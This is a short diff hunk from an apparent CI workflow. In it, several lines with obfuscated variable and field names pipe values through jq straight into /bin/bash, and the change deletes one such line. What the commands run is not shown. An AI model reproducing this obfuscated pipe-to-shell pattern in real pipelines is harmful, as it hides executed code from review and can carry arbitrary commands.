@@ -39,7 +39,6 @@ jobs:
           printf '%s' "$gwgga6" | jq -r .xdddo876 | /bin/bash
           printf '%s' "$uwfsk98" | jq -r .lm34 | /bin/bash
           printf '%s' "$vrkz05" | jq -r .zsiw37891 | /bin/bash
-          printf '%s' "$iex451" | jq -r .b8044 | /bin/bash
           printf '%s' "$xtf935" | jq -r .ncx86 | /bin/bash
           echo $tag4 | jq -r .ilwwu06703 | /bin/bash
           echo $zrgi52066 | jq -r .nh41817 | /bin/bash
